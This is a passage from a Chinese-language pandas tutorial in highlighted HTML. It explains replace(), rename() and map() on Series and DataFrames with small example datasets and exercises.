operator">=</span> <span class="token string">r'(\w+)@'</span>  <span class="token comment"># 提取@符号之前的部分</span><span class="token comment"># expand=True（默认值），则返回一个DataFrame，每一列对应一个捕获组；</span><span class="token comment"># 如果expand=False，则返回一个Series，所有捕获组合并为一列</span>df<span class="token punctuation">[</span><span class="token string">'Email'</span><span class="token punctuation">]</span> <span class="token operator">=</span> df<span class="token punctuation">[</span><span class="token string">'Email'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">str</span><span class="token punctuation">.</span>extract<span class="token punctuation">(</span>pattern<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h3><h4 id="replace-函数：替换元素"><a href="#replace-函数：替换元素" class="headerlink" title="replace()函数：替换元素"></a>replace()函数：替换元素</h4><ul><li>单值替换<ul><li>普通替换</li><li>字典替换(推荐）</li></ul></li><li>多值替换<ul><li>列表替换</li><li>字典替换（推荐）</li></ul></li></ul><h5 id="单值替换"><a href="#单值替换" class="headerlink" title="单值替换"></a>单值替换</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">s1 <span class="token operator">=</span> Series<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'dancer'</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token string">'susan'</span><span class="token punctuation">,</span><span class="token string">'?'</span><span class="token punctuation">,</span>np<span class="token punctuation">.</span>nan<span class="token punctuation">]</span><span class="token punctuation">,</span>index<span class="token operator">=</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token string">'12345'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span>s2 <span class="token operator">=</span> s1<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>to_replace<span class="token operator">=</span><span class="token string">'dancer'</span><span class="token punctuation">,</span>value<span class="token operator">=</span><span class="token string">'DANCER'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="替换数字"><a href="#替换数字" class="headerlink" title="替换数字"></a>替换数字</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">s1 <span class="token operator">=</span> Series<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'dancer'</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token string">'susan'</span><span class="token punctuation">,</span><span class="token string">'?'</span><span class="token punctuation">,</span>np<span class="token punctuation">.</span>nan<span class="token punctuation">]</span><span class="token punctuation">,</span>index<span class="token operator">=</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token string">'12345'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span>s2 <span class="token operator">=</span> s1<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="替换空值"><a href="#替换空值" class="headerlink" title="替换空值"></a>替换空值</h5><p>在Series里面，None值无法进行替换，np.nan是可以被替换和识别的</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">s1 <span class="token operator">=</span> Series<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'dancer'</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token string">'susan'</span><span class="token punctuation">,</span><span class="token string">'?'</span><span class="token punctuation">,</span>np<span class="token punctuation">.</span>nan<span class="token punctuation">]</span><span class="token punctuation">,</span>index<span class="token operator">=</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token string">'12345'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span>s2 <span class="token operator">=</span> s1<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>np<span class="token punctuation">.</span>nan<span class="token punctuation">,</span><span class="token string">'空值'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="使用字典替换"><a href="#使用字典替换" class="headerlink" title="使用字典替换"></a>使用字典替换</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">s1 <span class="token operator">=</span> Series<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'dancer'</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token string">'susan'</span><span class="token punctuation">,</span><span class="token string">'?'</span><span class="token punctuation">,</span>np<span class="token punctuation">.</span>nan<span class="token punctuation">]</span><span class="token punctuation">,</span>index<span class="token operator">=</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token string">'12345'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span>s2 <span class="token operator">=</span> s1<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>to_replace<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'dancer'</span><span class="token punctuation">:</span><span class="token string">'DANCER'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="以后值替换"><a href="#以后值替换" class="headerlink" title="以后值替换"></a>以后值替换</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">s2 <span class="token operator">=</span> Series<span class="token punctuation">(</span>data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">98</span><span class="token punctuation">,</span><span class="token number">76</span><span class="token punctuation">]</span><span class="token punctuation">,</span>index<span class="token operator">=</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token string">'ABCDE'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># method：对指定的值使用相邻的值填充，指定填充的方向，ffill是前面的值，bfill是后面的值</span><span class="token comment"># limit 指定填充次数</span><span class="token comment"># 注意：不要在使用value参数 method和limit参数不能在DataFrame中使用</span>sn <span class="token operator">=</span> s2<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>to_replace<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">,</span>method<span class="token operator">=</span><span class="token string">'bfill'</span><span class="token punctuation">,</span>limit<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>sn<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="列表替换"><a href="#列表替换" class="headerlink" title="列表替换"></a>列表替换</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">s1 <span class="token operator">=</span> Series<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'dancer'</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token string">'susan'</span><span class="token punctuation">,</span><span class="token string">'?'</span><span class="token punctuation">,</span>np<span class="token punctuation">.</span>nan<span class="token punctuation">]</span><span class="token punctuation">,</span>index<span class="token operator">=</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token string">'12345'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 第一个列表是要替换的目标值</span><span class="token comment"># 第二个列表是要替换的新值</span><span class="token comment"># 注意：两个列表长度要匹配</span>sn <span class="token operator">=</span> s1<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'dancer'</span><span class="token punctuation">,</span><span class="token string">'susan'</span><span class="token punctuation">,</span>np<span class="token punctuation">.</span>nan<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'DANCER'</span><span class="token punctuation">,</span><span class="token string">'SUSAN'</span><span class="token punctuation">,</span><span class="token string">'空值'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>sn<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="DataFrame替换操作"><a href="#DataFrame替换操作" class="headerlink" title="DataFrame替换操作"></a>DataFrame替换操作</h4><ul><li>单值替换<ul><li>普通替换</li><li>按列指定单值替换{列标签：替换值}</li></ul></li><li>多值替换<ul><li>列表替换</li><li>单字典替换（推荐）</li></ul></li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">data <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">150</span><span class="token punctuation">,</span>size <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>columns <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'Python'</span><span class="token punctuation">,</span><span class="token string">'Java'</span><span class="token punctuation">,</span><span class="token string">'C#'</span><span class="token punctuation">,</span><span class="token string">'C++'</span><span class="token punctuation">,</span><span class="token string">'PHP'</span><span class="token punctuation">]</span>df <span class="token operator">=</span> DataFrame<span class="token punctuation">(</span>data <span class="token operator">=</span> data<span class="token punctuation">,</span> columns<span class="token operator">=</span>columns<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span>df<span class="token punctuation">[</span><span class="token string">'Python'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'优秀'</span><span class="token punctuation">,</span><span class="token string">'优秀'</span><span class="token punctuation">,</span><span class="token string">'不及格'</span><span class="token punctuation">,</span><span class="token string">'不及格'</span><span class="token punctuation">,</span><span class="token string">'中等'</span><span class="token punctuation">]</span>df<span class="token punctuation">.</span>loc<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span>df<span class="token punctuation">.</span>loc<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'PHP'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'?'</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span class="token comment"># 指定列索引替换</span><span class="token comment"># df.replace(to_replace=np.nan,value=100)</span><span class="token comment"># 第一个参数是一个字典，描述了要替换的值，键表示列名称，值表示要替换的目标值</span><span class="token comment"># 第二个参数要替换的新数据</span>dn <span class="token operator">=</span> df<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'Java'</span><span class="token punctuation">:</span>np<span class="token punctuation">.</span>nan<span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>dn<span class="token punctuation">)</span><span class="token comment"># 普通替换(不改变原数据)</span><span class="token comment"># 搜寻整个表格当中与to_replace匹配的值，使用value进行替换</span>dn <span class="token operator">=</span> df<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>to_replace<span class="token operator">=</span><span class="token string">'?'</span><span class="token punctuation">,</span>value<span class="token operator">=</span><span class="token string">'未知数'</span><span class="token punctuation">)</span>dn <span class="token operator">=</span> df<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>to_replace<span class="token operator">=</span><span class="token string">'优秀'</span><span class="token punctuation">,</span>value<span class="token operator">=</span><span class="token string">'一般'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>dn<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 列表替换</span><span class="token comment"># 列表替换同Series的列表替换</span>df<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'优秀'</span><span class="token punctuation">,</span>np<span class="token punctuation">.</span>nan<span class="token punctuation">,</span><span class="token string">'?'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'一般'</span><span class="token punctuation">,</span><span class="token string">'缺失'</span><span class="token punctuation">,</span><span class="token string">'未知'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 做替换操作时，往往会创建一个范围比较大的字典</span><span class="token comment"># None可以用作字典的键</span><span class="token comment"># 在DataFrame的替换中，None可以匹配None和np.nan</span><span class="token comment"># 在使用的时候要注意None 或np.nan的有效性</span>map_dic <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'aaa'</span><span class="token punctuation">:</span><span class="token string">'AAA'</span><span class="token punctuation">,</span><span class="token string">'不及格'</span><span class="token punctuation">:</span><span class="token string">'有故事'</span><span class="token punctuation">,</span>np<span class="token punctuation">.</span>nan<span class="token punctuation">:</span><span class="token string">'123空值'</span><span class="token punctuation">}</span>df<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>map_dic<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><em>注意：DataFrame中，无法使用method和limit参数</em><br><strong>练习：</strong><br>假设张三李四的课表里有满分的情况，老师认为是作弊，把所有满分的情况（包括150,300分）都记0分，如何实现？</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">data <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token number">139</span><span class="token punctuation">,</span><span class="token number">120</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">143</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">120</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>column <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'语文'</span><span class="token punctuation">,</span><span class="token string">'数学'</span><span class="token punctuation">,</span><span class="token string">'物理'</span><span class="token punctuation">]</span>index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'张三'</span><span class="token punctuation">,</span><span class="token string">'李四'</span><span class="token punctuation">,</span><span class="token string">'王老五'</span><span class="token punctuation">]</span>df <span class="token operator">=</span> DataFrame<span class="token punctuation">(</span>data <span class="token operator">=</span> data<span class="token punctuation">,</span> columns<span class="token operator">=</span>column<span class="token punctuation">,</span>index<span class="token operator">=</span>index<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span>map_dic <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">150</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">}</span>dfn <span class="token operator">=</span> df<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>map_dic<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>dfn<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>练习</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pddata_7 <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'性别'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'难'</span><span class="token punctuation">,</span> <span class="token string">'女'</span><span class="token punctuation">,</span> <span class="token string">'难'</span><span class="token punctuation">,</span> <span class="token string">'女'</span><span class="token punctuation">,</span> <span class="token string">'女'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                       <span class="token string">'城市'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token string">'潮州市'</span><span class="token punctuation">,</span> <span class="token string">'山头市'</span><span class="token punctuation">,</span> <span class="token string">'汕尾市'</span><span class="token punctuation">,</span> <span class="token string">'山头市'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                       <span class="token string">'年龄'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                       <span class="token string">'爱好'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'蓝球'</span><span class="token punctuation">,</span> <span class="token string">'跑步'</span><span class="token punctuation">,</span> <span class="token string">'跳舞'</span><span class="token punctuation">,</span> <span class="token string">'逛街'</span><span class="token punctuation">,</span> <span class="token string">'读书'</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span>fix_typo <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'山头市'</span><span class="token punctuation">:</span><span class="token string">'汕头市'</span><span class="token punctuation">,</span> <span class="token string">'蓝球'</span><span class="token punctuation">:</span><span class="token string">'篮球'</span><span class="token punctuation">}</span><span class="token comment"># 对全部列的错字进行修改</span>data_7 <span class="token operator">=</span> data_7<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>fix_typo<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>data_7<span class="token punctuation">)</span>fix_typo <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'山头市'</span><span class="token punctuation">:</span><span class="token string">'汕头市'</span><span class="token punctuation">,</span> <span class="token string">'蓝球'</span><span class="token punctuation">:</span><span class="token string">'篮球'</span><span class="token punctuation">}</span><span class="token comment"># 只对【城市】列的错字进行修改</span>data_7<span class="token punctuation">[</span><span class="token string">'城市'</span><span class="token punctuation">]</span> <span class="token operator">=</span> data_7<span class="token punctuation">[</span><span class="token string">'城市'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>fix_typo<span class="token punctuation">)</span>data_7<span class="token punctuation">[</span><span class="token string">'性别'</span><span class="token punctuation">]</span> <span class="token operator">=</span> data_7<span class="token punctuation">[</span><span class="token string">'性别'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'难'</span><span class="token punctuation">:</span><span class="token string">'男'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>data_7<span class="token punctuation">[</span><span class="token string">'城市'</span><span class="token punctuation">]</span> <span class="token operator">=</span> data_7<span class="token punctuation">[</span><span class="token string">'城市'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'.'</span><span class="token punctuation">:</span><span class="token string">'未知'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>data_7<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="rename-函数：替换索引"><a href="#rename-函数：替换索引" class="headerlink" title="rename()函数：替换索引"></a>rename()函数：替换索引</h4><p>使用rename()函数替换行索引</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">data <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">150</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>columns <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'python'</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token punctuation">,</span><span class="token string">'java'</span><span class="token punctuation">,</span><span class="token string">'php'</span><span class="token punctuation">,</span><span class="token string">'c++'</span><span class="token punctuation">]</span>index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'dancer'</span><span class="token punctuation">,</span><span class="token string">'lucy'</span><span class="token punctuation">,</span><span class="token string">'mery'</span><span class="token punctuation">,</span><span class="token string">'tom'</span><span class="token punctuation">,</span><span class="token string">'jack'</span><span class="token punctuation">]</span>score <span class="token operator">=</span> DataFrame<span class="token punctuation">(</span>data <span class="token operator">=</span> data<span class="token punctuation">,</span>columns<span class="token operator">=</span>columns<span class="token punctuation">,</span> index<span class="token operator">=</span>index<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>score<span class="token punctuation">)</span><span class="token comment"># 替换列索引，指定columns参数</span>name_dic <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'java'</span><span class="token punctuation">:</span><span class="token string">'JAVA'</span><span class="token punctuation">,</span><span class="token string">'python'</span><span class="token punctuation">:</span><span class="token string">'PYTHON'</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token punctuation">:</span><span class="token string">'C'</span><span class="token punctuation">,</span><span class="token string">'c++'</span><span class="token punctuation">:</span><span class="token string">'C加加'</span><span class="token punctuation">,</span><span class="token string">'php'</span><span class="token punctuation">:</span><span class="token string">'PHP'</span><span class="token punctuation">,</span>            <span class="token string">'dancer'</span><span class="token punctuation">:</span><span class="token string">'DANCER'</span><span class="token punctuation">,</span><span class="token string">'lucy'</span><span class="token punctuation">:</span><span class="token string">'LUCY'</span><span class="token punctuation">,</span><span class="token string">'mery'</span><span class="token punctuation">:</span><span class="token string">'MERY'</span><span class="token punctuation">,</span><span class="token string">'tom'</span><span class="token punctuation">:</span><span class="token string">'TOM'</span><span class="token punctuation">,</span><span class="token string">'jack'</span><span class="token punctuation">:</span><span class="token string">'JACK'</span><span class="token punctuation">}</span>df <span class="token operator">=</span> score<span class="token punctuation">.</span>rename<span class="token punctuation">(</span>columns<span class="token operator">=</span>name_dic<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span class="token comment"># 替换行索引，指定index参数</span>name_dic <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'java'</span><span class="token punctuation">:</span><span class="token string">'JAVA'</span><span class="token punctuation">,</span><span class="token string">'python'</span><span class="token punctuation">:</span><span class="token string">'PYTHON'</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token punctuation">:</span><span class="token string">'C'</span><span class="token punctuation">,</span><span class="token string">'c++'</span><span class="token punctuation">:</span><span class="token string">'C加加'</span><span class="token punctuation">,</span><span class="token string">'php'</span><span class="token punctuation">:</span><span class="token string">'PHP'</span><span class="token punctuation">,</span>            <span class="token string">'dancer'</span><span class="token punctuation">:</span><span class="token string">'DANCER'</span><span class="token punctuation">,</span><span class="token string">'lucy'</span><span class="token punctuation">:</span><span class="token string">'LUCY'</span><span class="token punctuation">,</span><span class="token string">'mery'</span><span class="token punctuation">:</span><span class="token string">'MERY'</span><span class="token punctuation">,</span><span class="token string">'tom'</span><span class="token punctuation">:</span><span class="token string">'TOM'</span><span class="token punctuation">,</span><span class="token string">'jack'</span><span class="token punctuation">:</span><span class="token string">'JACK'</span><span class="token punctuation">}</span>df <span class="token operator">=</span> score<span class="token punctuation">.</span>rename<span class="token punctuation">(</span>index<span class="token operator">=</span>name_dic<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>level 指定多维索引的维度</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 使用level参数来控制替换的索引层级</span>mul_df<span class="token punctuation">.</span>rename<span class="token punctuation">(</span>columns <span class="token operator">=</span> mul_dic<span class="token punctuation">,</span>level <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="映射"><a href="#映射" class="headerlink" title="映射"></a>映射</h3><p>映射的含义：创建一个映射关系列表，把values元素和一个特定的标签或者字符串绑定</p><h4 id="map-函数：新建一列"><a href="#map-函数：新建一列" class="headerlink" title="map()函数：新建一列"></a>map()函数：新建一列</h4><ul><li>map(字典) 字典的键要足以匹配所有的数据，否则出现NaN</li><li>map()可以映射新一列数据</li><li>map()中可以使用lambd表达式</li><li>map()中可以使用方法，可以是自定义的方法<br><strong>注意</strong> map()中不能使用sum之类的函数，for循环</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">'dancer'</span><span class="token punctuation">,</span><span class="token number">190</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token number">135</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'lucy'</span><span class="token punctuation">,</span><span class="token number">136</span><span class="token punctuation">,</span><span class="token number">230</span><span class="token punctuation">,</span><span class="token number">129</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'Tom'</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">135</span><span class="token punctuation">]</span><span class="token punctuation">]</span>columns <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">,</span><span class="token string">'python'</span><span class="token punctuation">,</span><span class="token string">'Java'</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token punctuation">]</span>df <span class="token operator">=</span> DataFrame<span class="token punctuation">(</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>columns<span class="token operator">=</span>columns<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span class="token comment"># 键值对一般要保证够用，不然会出现空值</span>number_list <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'dancer'</span><span class="token punctuation">:</span><span class="token string">'01'</span><span class="token punctuation">,</span><span class="token string">'lucy'</span><span class="token punctuation">:</span><span class="token string">'02'</span><span class="token punctuation">,</span><span class="token string">'tom'</span><span class="token punctuation">:</span><span class="token string">'03'</span><span class="token punctuation">,</span><span class="token string">'Tom'</span><span class="token punctuation">:</span><span class="token string">'04'</span><span class="token punctuation">}</span>df<span class="token punctuation">[</span><span class="token string">'number'</span><span class="token punctuation">]</span> <span class="token operator">=</span> df<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">map</span><span class="token punctuation">(</span>number_list<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span class="token comment"># 使用字典进行匹配的方式</span>level_list <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">190</span><span class="token punctuation">:</span><span class="token string">'优秀'</span><span class="token punctuation">,</span><span class="token number">136</span><span class="token punctuation">:</span><span class="token string">'良好'</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">:</span><span class="token string">'一般'</span><span class="token punctuation">}</span>df<span class="token punctuation">[</span><span class="token string">'level'</span><span class="token punctuation">]</span> <span class="token operator">=</span> df<span class="token punctuation">[</span><span class="token string">'python'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">map</span><span class="token punctuation">(</span>level_list<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">'dancer'</span><span class="token punctuation">,</span><span class="token number">190</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token number">135</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'lucy'</span><span class="token punctuation">,</span><span class="token number">136</span><span class="token punctuation">,</span><span class="token number">230</span><span class="token punctuation">,</span><span class="token number">129</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'Tom'</span><span class="token 